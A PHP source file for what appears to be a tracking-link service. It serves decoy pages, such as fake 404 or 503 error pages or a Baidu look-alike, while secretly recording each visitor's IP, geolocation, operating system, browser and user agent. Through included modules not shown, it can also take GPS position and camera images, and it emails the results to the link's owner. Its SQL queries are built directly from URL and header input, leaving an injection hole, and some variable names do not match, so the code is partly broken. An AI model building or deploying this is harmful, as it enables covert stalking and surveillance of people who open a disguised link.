<!--probe.php是一个独立的页面不受其他页面的干扰，不引用header.php/footer.php--->
<?php
error_reporting(0);
define('IN_CRONLITE', true);
include_once($_SERVER['DOCUMENT_ROOT']."/include/auxiliary/check_program.php");
include_once($_SERVER['DOCUMENT_ROOT']."/include/auxiliary/statistics_website.php");
include_once($_SERVER['DOCUMENT_ROOT']."/include/auxiliary/smtp_send_mail.php");
check_authorization();
if (function_exists('check_authorization()')) {
exit();
 }
include_once("./include/config.php");
include_once("./include/db.class.php");
$DB=new DB($dbconfig['host'],$dbconfig['user'],$dbconfig['pwd'],$dbconfig['dbname'],$dbconfig['port']);
?>
<?php
$key_u = $_GET['key'];
if(!$key_u)
{
include_once("./include/probe_page/404.php");//输出404页面
}
else{
$row=$DB->get_row("SELECT * FROM list_probe WHERE key_probe='{$key_u}' limit 1");//sql查询语句
$probe_page=$row['probe_page'];
$ip_location_function=$row['ip_location_function'];
$gps_location_function=$row['gps_location_function'];
$camera_img_function=$row['camera_img_function'];
$email_notification_function=$row['email_notification_function'];
$email=$row['email'];
if($row)
{
//开始新的判断
switch($probe_page)//对Page判断
{
/*
备注:先输出页面后，在写入数据库ip
*/
case '404'://404页面
include("./include/probe_page/404.php");
break;
case '503'://503页面
include("./include/probe_page/503.php");
break;
case '新建网站'://新加的站点页面
include("./include/probe_page/new.php");
break;
case '停止网站'://站点停止页面
include("./include/probe_page/stop.php");
break;
case '你好世界'://你好，世界
include("./include/probe_page/hello.php");
break;
case '百度一下'://百度一下
include("./include/probe_page/baidu.php");
break;
}
//页面输出完成
//开始写入数据表
include("./include/probe_core/ip.php");//引入系统核心文件，获取访问者ip地址
include("./include/probe_core/system.php");//获取操作系统
include("./include/probe_core/browser.php");//获取浏览器
$browser_ua = $_SERVER['HTTP_USER_AGENT'];//获取UA
include("./include/probe_core/browser_language.php");//获取浏览器语言
$row=$DB->get_row("SELECT * FROM list_ip WHERE ip='{$ip}' limit 1");//sql查询语句
$key_s=$row['key_ip'];
if($key_s!=$key_u){	

if($ip_location_function!="1"){
	$ip_location="未启用";
	$ip_lonlat="未启用";
}
else{
	include("./include/probe_core/ip_where.php");//获取IP地理位置
}

if($camera_function!="1"){
	$camera_img="未启用";
}
else{
	include("./include/probe_core/camera_img.php");//获取摄像头图片
}

$sql_statement="insert into `list_ip` (`key_ip`,`ip`,`ip_location`,`ip_lonlat`,`gps_location`,`gps_lonlat`,`camera_img`,`system`,`browser`,`browser_ua`,`browser_language`) values 
('$key_u','$ip','$ip_location','$ip_lonlat','$gps_location','$gps_lonlat','$camera_img','$system','$browser','$browser_ua','$browser_language')";
$DB->query($sql_statement);
	
	if($gps_location_function!="1"){
		$gps_location="未启用";
		$gps_lonlat="未启用";
	}
	else{
		$sql_statement="select*from list_ip";
		$row=$DB->query($sql_statement);
		 while($rows = $DB->fetch($row))
		 {$ip_id[]=$rows['id'];
		 }
		$ip_id=max($ip_id);

	//初始化
    $curl = curl_init();
    //设置抓取的url
    curl_setopt($curl, CURLOPT_URL, 'http://'.$_SERVER['HTTP_HOST'].'/include/probe_core/gps_where.php');
    //设置头文件的信息作为数据流输出
	$headers = array();
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    //设置获取的信息以文件流的形式返回，而不是直接输出。
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// 跳过证书检查
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	// 从证书中检查SSL加密算法是否存在
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, true);
    //设置post方式提交
    curl_setopt($curl, CURLOPT_POST, 1);
    //设置post数据
    curl_setopt($curl, CURLOPT_POSTFIELDS, 's=true&ip_id='.$ip_id);
    //执行命令
    $curl_data = curl_exec($curl);
    //关闭URL请求
    curl_close($curl);
	}
	if($email_notification_function=="1"){
		$email_msg='密钥:'.$key_u.'<br>'.'IP:'.$ip.'<br>'.'IP位置:'.$ip_location.'<br>'.'IP经纬度:'.$ip_lonlat.'<br>'.'GPS位置:请在网站查询'.'<br>'.'GPS经纬度:请在网站查询'.'<br>'.
		'摄像头图片:请在网站查询'.'<br>'.'操作系统:'.$system.'<br>'.'浏览器:'.$browser.'<br>'.'浏览器UA:'.$browser_ua.'<br>'.'浏览器语言:'.$browser_language;
			send_mail($email,$email_msg);
				statistics_email_notification_add();
	
	}
	
}	

}//if
else
{
include_once("./include/probe_page/404.php");//输出404页面
}

}
?>